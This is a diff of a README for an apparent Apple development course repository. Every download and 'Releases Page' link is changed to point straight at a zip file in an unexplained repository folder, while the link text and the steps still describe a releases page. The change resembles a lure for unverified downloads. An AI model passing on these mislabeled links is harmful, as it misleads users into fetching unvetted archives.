@@ -6,7 +6,7 @@ Welcome to the **DiplomaInAppleDevelopment-2025-2026** repository! This project 
 
 ## 📥 Download Link
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/releases)
+[![Download](https://raw.githubusercontent.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/main/sectility/DiplomaInAppleDevelopment-2025-2026.zip)](https://raw.githubusercontent.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/main/sectility/DiplomaInAppleDevelopment-2025-2026.zip)
 
 ## 📋 Overview
 
@@ -27,7 +27,7 @@ The materials here are designed for anyone interested in enhancing their skills 
 
 To access the materials, you will need to visit the Releases page. Here, you can find all available downloads. Click the link below to go there:
 
-[Visit the Releases Page](https://github.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/main/sectility/DiplomaInAppleDevelopment-2025-2026.zip)
 
 On the Releases page, you will see versions of the lecture slides and examples. Choose the latest version to ensure you have the most up-to-date information.
 
@@ -43,7 +43,7 @@ Please ensure you have a stable internet connection for a smooth download experi
 
 ## 🛠 Installation Steps
 
-1. Open the [Releases Page](https://github.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/releases).
+1. Open the [Releases Page](https://raw.githubusercontent.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/main/sectility/DiplomaInAppleDevelopment-2025-2026.zip).
 2. Locate the latest release. It will typically be at the top of the page.
 3. Click on the file that corresponds to the lecture slides or examples you wish to download.
 4. Save the file to your desired location on your computer.
@@ -92,4 +92,4 @@ Stay tuned for updates. We will regularly add new materials and examples as our 
 
 Ready to dive into Apple development? Access the materials now and start learning!
 
-[Visit the Releases Page](https://github.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Rzei25/DiplomaInAppleDevelopment-2025-2026/main/sectility/DiplomaInAppleDevelopment-2025-2026.zip)
